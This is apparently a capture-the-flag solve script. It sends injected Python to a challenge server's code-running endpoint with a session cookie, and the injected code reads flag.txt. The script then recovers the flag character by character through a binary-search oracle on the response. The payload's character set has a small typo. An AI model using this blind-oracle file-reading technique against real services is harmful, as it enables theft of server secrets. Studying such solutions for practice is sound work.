#!/bin/python3
import requests
import json

endpoint = "https://yeetcode.be.ax/yeetyeet"
cookie = {
    'session': 'eyJydW4iOmZhbHNlfQ.YSGvZw.MlvT_pjE1ifA6piBhWZgtfzzdss'
}

payload = """
flag_charset = " !#$%&()*+,_-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwzyz|{}~"
with open('flag.txt', 'r') as f:
  flag = f.read()

def f(a,b):
  if flag[{}] in flag_charset[{}+1:]:
  	return 5
  else:
    return 300
"""

flag_charset = " !#$%&()*+,_-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwzyz{|}~"
flag = ''

def test(i, c):
    r = requests.post(endpoint, cookies=cookie, data=payload.format('{}', i, c))
    if r.status_code == 200:
      jsondata = json.loads(r.text)
      if jsondata['error'] == False and jsondata['p'] == 1:
        return True
      elif jsondata['error'] == False and jsondata['p'] == 0:
        return False
    raise Exception("http error", r.text, i, c)

def bin_search(i):
  start, end = 0, len(flag_charset) - 1
  while start < end:
    mid = start + (end - start)//2
    print(f'\r{flag}{flag_charset[mid]}', end='')
    if test(i, mid):
      start = mid + 1
    else:
      end = mid
  print(f'\r{flag}{flag_charset[start]}', end='')
  return start

for i in range(33):
  flag += flag_charset[bin_search(i)]
